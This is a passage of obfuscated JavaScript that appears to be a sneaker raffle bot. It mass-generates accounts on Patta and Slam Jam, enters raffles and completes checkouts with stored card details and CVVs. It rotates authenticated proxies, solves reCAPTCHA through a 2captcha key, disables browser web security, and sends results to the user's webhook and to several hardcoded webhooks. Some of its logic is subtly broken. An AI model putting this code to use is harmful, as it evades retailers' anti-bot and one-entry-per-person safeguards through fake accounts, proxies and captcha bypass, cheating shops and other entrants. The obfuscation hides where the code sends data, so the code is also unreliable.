                '--proxy-server=' + _0x159701[0x0] + ':' + _0x159701[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x192f29 = await _0x348acb['newPage']();
            await _0x192f29['authenticate']({
                'username': '' + _0x159701[0x2],
                'password': '' + _0x159701[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x39ff46['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x192f29['setRequestInterception'](!![]), _0x192f29['on']('request', _0x224948 => {
                _0x224948['resourceType']() === 'image' || _0x224948['resourceType']() === 'font' || _0x224948['resourceType']() === 'media' ? _0x224948['abort']() : _0x224948['continue']();
            }), await _0x192f29['goto'](_0x442b94), await _0x4a79d2(0xbb8), await _0x192f29['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x49028e() + '\x20[' + _0x39ff46['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Filling\x20information'), await _0x192f29['type']('#RegisterForm-FirstName', '' + _0x2f34af[_0x1b2f6d]['FirstName']), await _0x4a79d2(0x226), await _0x192f29['type']('#RegisterForm-LastName', '' + _0x2f34af[_0x1b2f6d]['LastName']), await _0x4a79d2(0x226), await _0x192f29['type']('#RegisterForm-email', '' + _0x2f34af[_0x1b2f6d]['Email']), await _0x4a79d2(0x226), await _0x192f29['type']('#RegisterForm-password', '' + _0x2f34af[_0x1b2f6d]['Password']), await _0x4a79d2(0x226), console['log'](_0x49028e() + '\x20[' + _0x39ff46['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Submitting..'), await _0x192f29['$eval']('#RegisterForm', _0x1855c7 => _0x1855c7['submit']()), await _0x4a79d2(0x1f40);
            try {
                await _0x192f29['waitForSelector']('.home-page-grid__collection'), await _0x4a79d2(0x1f4), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x39ff46['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Account\x20' + _0x2f34af[_0x1b2f6d]['Email'] + '\x20Generated!')), _0x7af797['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x2f34af[_0x1b2f6d]['Email'] + ',' + _0x2f34af[_0x1b2f6d]['Password']), console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x39ff46['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Account\x20' + _0x2f34af[_0x1b2f6d]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x162902['succesDEVMSG']);
                } catch {
                }
                await _0x2110d2(_0x18784f, _0x162902['succesDEVMSG']);
            } catch (_0x56e377) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x56e377));
            }
        } catch (_0x468546) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20' + _0x468546));
        } finally {
            _0x348acb && _0x348acb['close'](), console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x2f363d(_0x155930, _0x34a5ba, _0x227c04, _0x5abc57) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2be66e = 0x0; _0x2be66e < _0x227c04['length']; _0x2be66e++) {
        var _0x228a03, _0x1734d8 = '', _0x16eafe = 0x0;
        _0x1dc4b6(_0x34a5ba['name'] + '\x20Task\x20' + (_0x2be66e + 0x1) + '\x20/\x20' + _0x227c04['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x227c04, _0x2be66e);
        if (_0x227c04[_0x2be66e]['Email'] == '' || _0x227c04[_0x2be66e]['Password'] == '' || _0x227c04[_0x2be66e]['FirstName'] == '' || _0x227c04[_0x2be66e]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x281f93 = _0x5abc57[_0x2be66e]['split'](':');
        else
            var _0x39a759 = Math['round'](Math['random']() * (_0x5abc57['length'] - 0x1)), _0x281f93 = _0x5abc57[_0x39a759]['split'](':');
        const _0x4d9942 = await _0x479f93['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x281f93[0x0] + ':' + _0x281f93[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x398338 = await _0x4d9942['newPage']();
            await _0x398338['authenticate']({
                'username': '' + _0x281f93[0x2],
                'password': '' + _0x281f93[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x398338['setRequestInterception'](!![]), _0x398338['on']('request', _0x22a07c => {
                _0x22a07c['resourceType']() === 'image' || _0x22a07c['resourceType']() === 'font' || _0x22a07c['resourceType']() === 'media' ? _0x22a07c['abort']() : _0x22a07c['continue']();
            }), await _0x398338['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x398338['waitForSelector']('#CustomerEmail'), console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Logging\x20in..'), await _0x398338['type']('#CustomerEmail', '' + _0x227c04[_0x2be66e]['Email']), await _0x4a79d2(0x12c), await _0x398338['type']('#CustomerPassword', '' + _0x227c04[_0x2be66e]['Password']), await _0x4a79d2(0x226), await _0x398338['$eval']('#customer_login', _0x35d715 => _0x35d715['submit']());
            try {
                await _0x398338['waitForSelector']('#orders'), await _0x4a79d2(0x4b0);
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x398338['goto']('' + _0x227c04[_0x2be66e]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4a79d2(0xbb8), console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x398338['waitForSelector']('#email');
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x398338['type']('#email', '' + _0x227c04[_0x2be66e]['Email']), await _0x4a79d2(0x384), await _0x398338['type']('#first_name', '' + _0x227c04[_0x2be66e]['FirstName']), await _0x4a79d2(0x514), await _0x398338['type']('#last_name', '' + _0x227c04[_0x2be66e]['LastName']), await _0x4a79d2(0x514), await _0x398338['type']('#street_address', _0x227c04[_0x2be66e]['Address1'] + '\x20' + _0x227c04[_0x2be66e]['HouseNumber'] + '\x20' + _0x227c04[_0x2be66e]['Address2']), await _0x4a79d2(0x2bc);
            _0x227c04[_0x2be66e]['Postcode'] == undefined && (_0x227c04[_0x2be66e]['Postcode'] = _0x227c04[_0x2be66e]['Zip']);
            await _0x398338['type']('#zip_code', '' + _0x227c04[_0x2be66e]['Postcode']), await _0x4a79d2(0x320), await _0x398338['type']('#city', '' + _0x227c04[_0x2be66e]['City']), await _0x4a79d2(0x320), await _0x398338['type']('#bday', '01/01/1994'), await _0x4a79d2(0x320), await _0x398338['type']('#instagram', '' + _0x227c04[_0x2be66e]['Follower']), await _0x4a79d2(0x352);
            if (_0x227c04[_0x2be66e]['Size'] == 'RANDOM') {
                const _0x36e170 = await _0x398338['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x35b342 => {
                    return _0x35b342['map'](_0x528614 => _0x528614['textContent']);
                });
                var _0x114193 = Math['round'](Math['random']() * (_0x36e170['length'] - 0x1));
                console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x36e170[_0x114193]), await _0x398338['click']('label[data-eu-size=\x22' + _0x36e170[_0x114193] + '\x22]');
            } else {
                console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x227c04[_0x2be66e]['Size']);
                try {
                    await _0x398338['click']('label[data-eu-size=\x22' + _0x227c04[_0x2be66e]['Size'] + '\x22]');
                } catch {
                    await _0x398338['click']('label[data-eu-size=\x22' + _0x227c04[_0x2be66e]['Size'] + '.0\x22]');
                }
            }
            await _0x4a79d2(0xbb8), await _0x398338['$$eval']('.raffle__checkbox-label', _0x122d94 => _0x122d94['forEach'](_0x131cee => _0x131cee['click']())), await _0x4a79d2(0x7d0), console['log'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x398338['click']('#raffle__form-submit'), await _0x4a79d2(0x1388);
            try {
                await _0x398338['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x1342d2) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1342d2));
            }
        } catch (_0x5a4745) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20' + _0x5a4745)), _0x1734d8 = 'yes';
        } finally {
            _0x4d9942 && _0x4d9942['close']();
            if (_0x1734d8 == 'yes' && _0x16eafe != 0x5) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x34a5ba['name'] + ']\x20Task\x20' + (_0x2be66e + 0x1) + '\x20:\x20Retrying')), _0x2be66e = _0x2be66e - 0x1, _0x16eafe = _0x16eafe + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x8b37be(_0x4b54d2, _0x1ac530, _0x4a095f, _0xa62b76) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1bcdab = 0x0; _0x1bcdab < _0x4a095f['length']; _0x1bcdab++) {
        var _0x564e59 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }];
        const _0x23e414 = { 'embeds': _0x564e59 };
        _0x1dc4b6(_0x1ac530['name'] + '\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20/\x20' + _0x4a095f['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x4a095f, _0x1bcdab);
        var _0x450782 = await _0x2df3ee(_0x4a095f[_0x1bcdab], _0x1ac530, 'acc', ![]);
        const _0x33f258 = { 'succesDEVMSG': { 'embeds': [_0x450782] } };
        if (_0x4a095f[_0x1bcdab]['Email'] == '' || _0x4a095f[_0x1bcdab]['FirstName'] == '' || _0x4a095f[_0x1bcdab]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4a79d2(0x7d0);
            continue;
        }
        (_0x4a095f[_0x1bcdab]['Password'] == '' || _0x4a095f[_0x1bcdab] == undefined) && _0x4a095f[_0x1bcdab]['Password'] == 'JRaffles23!';
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x1ca512 = _0xa62b76[_0x1bcdab]['split'](':');
        else
            var _0x3af49b = Math['round'](Math['random']() * (_0xa62b76['length'] - 0x1)), _0x1ca512 = _0xa62b76[_0x3af49b]['split'](':');
        const _0x44d1b9 = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1ca512[0x0] + ':' + _0x1ca512[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4d7f3f = await _0x44d1b9['newPage']();
            await _0x4d7f3f['authenticate']({
                'username': '' + _0x1ca512[0x2],
                'password': '' + _0x1ca512[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d7f3f['setRequestInterception'](!![]), _0x4d7f3f['on']('request', _0x3b8ebb => {
                _0x3b8ebb['resourceType']() === 'image' || _0x3b8ebb['resourceType']() === 'font' || _0x3b8ebb['resourceType']() === 'media' ? _0x3b8ebb['abort']() : _0x3b8ebb['continue']();
            }), await _0x4d7f3f['goto']('https://drop.slamjam.com/account/register'), await _0x4a79d2(0xbb8), await _0x4d7f3f['waitForSelector']('#FirstName'), await _0x4d7f3f['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4d7f3f['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Filling\x20information'), await _0x4a79d2(0x4b0), await _0x4d7f3f['type']('#FirstName', '' + _0x4a095f[_0x1bcdab]['FirstName']), await _0x4a79d2(0x226), await _0x4d7f3f['type']('#LastName', '' + _0x4a095f[_0x1bcdab]['LastName']), await _0x4a79d2(0x226), await _0x4d7f3f['type']('#Email', '' + _0x4a095f[_0x1bcdab]['Email']), await _0x4a79d2(0x2ee), await _0x4d7f3f['type']('#ConfirmEmail', '' + _0x4a095f[_0x1bcdab]['Email']), await _0x4a79d2(0x2ee), await _0x4d7f3f['type']('#CreatePassword', '' + _0x4a095f[_0x1bcdab]['Password']), await _0x4a79d2(0x2ee), await _0x4d7f3f['type']('#CreateConfirmPassword', '' + _0x4a095f[_0x1bcdab]['Password']), await _0x4a79d2(0x226), console['log'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Submitting..'), await _0x4d7f3f['$eval']('#create_customer', _0x3bbb33 => _0x3bbb33['submit']()), await _0x4a79d2(0x1388), console['log'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20' + _0x3b3689['cyan']('Solving\x20Captcha')), await _0x4d7f3f['solveRecaptchas'](), console['log'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4d7f3f['$eval']('.shopify-challenge__container\x20>\x20form', _0x1fafec => _0x1fafec['submit']());
            try {
                await _0x4d7f3f['waitForSelector']('.product-card__image'), await _0x4a79d2(0x1f4), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Account\x20' + _0x4a095f[_0x1bcdab]['Email'] + '\x20Generated!')), _0x7af797['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x4a095f[_0x1bcdab]['Email'] + ',' + _0x4a095f[_0x1bcdab]['Password']), console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x1ac530['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Account\x20' + _0x4a095f[_0x1bcdab]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x33f258['succesDEVMSG']);
                } catch {
                }
                await _0x2110d2(_0x18784f, _0x33f258['succesDEVMSG']);
            } catch (_0x5a03b6) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5a03b6));
            }
        } catch (_0x230a17) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1bcdab + 0x1) + '\x20:\x20' + _0x230a17));
        } finally {
            _0x44d1b9 && _0x44d1b9['close'](), console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x18b0de(_0x33ae7c, _0x28e0ab, _0x5d1490, _0xeff529) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x114344 = 0x0; _0x114344 < _0x5d1490['length']; _0x114344++) {
        var _0x3603a6, _0x21cbb3 = '', _0x47a6de = 0x0;
        _0x1dc4b6(_0x28e0ab['name'] + '\x20Task\x20' + (_0x114344 + 0x1) + '\x20/\x20' + _0x5d1490['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x5d1490, _0x114344);
        if (_0x5d1490[_0x114344]['Email'] == '' || _0x5d1490[_0x114344]['Password'] == '' || _0x5d1490[_0x114344]['FirstName'] == '' || _0x5d1490[_0x114344]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x3e735f = _0xeff529[_0x114344]['split'](':');
        else
            var _0x2410eb = Math['round'](Math['random']() * (_0xeff529['length'] - 0x1)), _0x3e735f = _0xeff529[_0x2410eb]['split'](':');
        const _0x2d6f5c = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3e735f[0x0] + ':' + _0x3e735f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x50e0d2 = await _0x2d6f5c['newPage']();
            await _0x50e0d2['authenticate']({
                'username': '' + _0x3e735f[0x2],
                'password': '' + _0x3e735f[0x3]
            }), await _0x50e0d2['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50e0d2['setRequestInterception'](!![]), _0x50e0d2['on']('request', _0x4d389c => {
                _0x4d389c['resourceType']() === 'image' || _0x4d389c['resourceType']() === 'font' || _0x4d389c['resourceType']() === 'media' ? _0x4d389c['abort']() : _0x4d389c['continue']();
            }), await _0x50e0d2['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x50e0d2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x50e0d2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4a79d2(0x258), await _0x50e0d2['waitForSelector']('#CustomerEmail'), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x50e0d2['type']('#CustomerEmail', '' + _0x5d1490[_0x114344]['Email']), await _0x4a79d2(0x12c), await _0x50e0d2['type']('#CustomerPassword', '' + _0x5d1490[_0x114344]['Password']), await _0x4a79d2(0x226), await _0x50e0d2['$eval']('#customer_login', _0x5eb87f => _0x5eb87f['submit']()), await _0x4a79d2(0x7d0), await _0x50e0d2['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20' + _0x3b3689['cyan']('Solving\x20Captcha')), await _0x50e0d2['solveRecaptchas'](), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x50e0d2['$eval']('.shopify-challenge__container\x20>\x20form', _0x1e5762 => _0x1e5762['submit']());
            try {
                await _0x50e0d2['waitForSelector']('.nav-account'), await _0x4a79d2(0x4b0);
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x50e0d2['goto']('' + _0x5d1490[_0x114344]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4a79d2(0xbb8), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x50e0d2['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x50e0d2['click']('.product-select-variant-wrapper'), await _0x4a79d2(0x320), await _0x50e0d2['click']('li.product-select-variant__value[data-size=\x22' + _0x5d1490[_0x114344]['Size'] + '\x22]'), await _0x4a79d2(0x384), await _0x50e0d2['$eval']('#AddToCartForm-product-template-raffle', _0x807e4b => _0x807e4b['submit']()), await _0x50e0d2['waitForSelector']('.cart-order-summary__content'), await _0x4a79d2(0x514), await _0x50e0d2['goto']('https://drop.slamjam.com/checkout'), await _0x4a79d2(0x514), await _0x50e0d2['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x50e0d2['select']('#checkout_shipping_address_country', '' + _0x5d1490[_0x114344]['Country']), await _0x4a79d2(0x200), await _0x50e0d2['waitForSelector']('#checkout_shipping_address_first_name'), await _0x50e0d2['type']('#checkout_shipping_address_first_name', '' + _0x5d1490[_0x114344]['FirstName']), await _0x4a79d2(0x237), await _0x50e0d2['type']('#checkout_shipping_address_last_name', '' + _0x5d1490[_0x114344]['LastName']), await _0x4a79d2(0x1e0), await _0x50e0d2['type']('#checkout_shipping_address_address1', _0x5d1490[_0x114344]['Address1'] + '\x20' + _0x5d1490[_0x114344]['HouseNumber']), await _0x4a79d2(0x514), await _0x50e0d2['type']('#checkout_shipping_address_address2', '' + _0x5d1490[_0x114344]['Address2']), await _0x4a79d2(0x514);
            _0x5d1490[_0x114344]['Postcode'] == undefined && (_0x5d1490[_0x114344]['Postcode'] = _0x5d1490[_0x114344]['Zip']);
            await _0x50e0d2['type']('#checkout_shipping_address_zip', '' + _0x5d1490[_0x114344]['Postcode']), await _0x4a79d2(0x2bc), await _0x50e0d2['type']('#checkout_shipping_address_city', '' + _0x5d1490[_0x114344]['City']), await _0x4a79d2(0x320), await _0x50e0d2['type']('#checkout_shipping_address_phone', '' + _0x5d1490[_0x114344]['Phone']), await _0x4a79d2(0x320), await _0x50e0d2['click']('#continue_button'), await _0x4a79d2(0xbb8), await _0x50e0d2['waitForSelector']('.summary-title'), await _0x4a79d2(0x320), await _0x50e0d2['click']('#continue_button'), await _0x4a79d2(0x320), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x50e0d2['waitForSelector']('#checkout_credit_card_vault'), await _0x4a79d2(0x3e8);
            var _0x272619 = await _0x50e0d2['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3331a8 = await _0x272619['contentFrame']();
            await _0x3331a8['click']('#number'), await _0x4a79d2(0x3e8), await _0x3331a8['type']('#number', '' + _0x5d1490[_0x114344]['CardNumber'], { 'delay': 0x78 }), _0x272619 = await _0x50e0d2['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3331a8 = await _0x272619['contentFrame'](), await _0x4a79d2(0x1c2), await _0x3331a8['click']('#name'), await _0x4a79d2(0x1f4), await _0x3331a8['type']('#name', '' + _0x5d1490[_0x114344]['NameOnCard'], { 'delay': 0x78 }), _0x272619 = await _0x50e0d2['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3331a8 = await _0x272619['contentFrame'](), await _0x4a79d2(0x1c2), await _0x3331a8['click']('#expiry'), await _0x4a79d2(0x1f4), await _0x3331a8['type']('#expiry', '' + _0x5d1490[_0x114344]['ExpiryDate'], { 'delay': 0x78 }), _0x272619 = await _0x50e0d2['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3331a8 = await _0x272619['contentFrame'](), await _0x4a79d2(0x1c2), await _0x3331a8['click']('#verification_value'), await _0x4a79d2(0x1f4), await _0x3331a8['type']('#verification_value', '' + _0x5d1490[_0x114344]['CVV'], { 'delay': 0x78 }), await _0x50e0d2['$eval']('#accepts-flag-raffle', _0x534930 => _0x534930['click']()), await _0x4a79d2(0x7d0), console['log'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x50e0d2['$eval']('#continue_button', _0x315a46 => _0x315a46['click']()), await _0x4a79d2(0x1b58), await _0x50e0d2['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x50e0d2['$eval']('.edit_checkout.animate-floating-labels', _0x58684c => _0x58684c['submit']()), await _0x4a79d2(0x7d0);
            try {
                await _0x50e0d2['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x1f20f8) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x1f20f8['message']);
            }
            var _0x5f4cab = await _0x2df3ee(_0x5d1490[_0x114344], _0x28e0ab, 'dev', ![]), _0x8cd1a9 = await _0x2df3ee(_0x5d1490[_0x114344], _0x28e0ab, 'pub', ![]);
            const _0x2de1b0 = {
                'succesDEVMSG': { 'embeds': [_0x5f4cab] },
                'succesPUBMSG': { 'embeds': [_0x8cd1a9] }
            };
            try {
                _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x2de1b0['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x2de1b0['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x19d1c2, _0x2de1b0['succesPUBMSG']);
            } catch (_0x1ad586) {
                console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1ad586));
            }
        } catch (_0x1c7620) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20' + _0x1c7620)), _0x3603a6 = '' + _0x1c7620;
            var _0x419296 = await _0x2df3ee(kickz[_0x114344], _0x28e0ab, 'dev', !![], _0x3603a6);
            EMBEDS['errorDEV'] = { 'embeds': [_0x419296] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], EMBEDS['errorDEV']), await _0x2110d2(_0x132dc8, EMBEDS['errorDEV']), _0x21cbb3 = 'yes';
        } finally {
            _0x2d6f5c && _0x2d6f5c['close']();
            if (_0x21cbb3 == 'yes' && _0x47a6de != 0x5) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x28e0ab['name'] + ']\x20Task\x20' + (_0x114344 + 0x1) + '\x20:\x20Retrying')), _0x114344 = _0x114344 - 0x1, _0x47a6de = _0x47a6de + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0xc7ab42(_0x11fbff, _0xf6f2a, _0x4833fe) {
    var _0x381e46 = ![], _0x272a94 = ![];
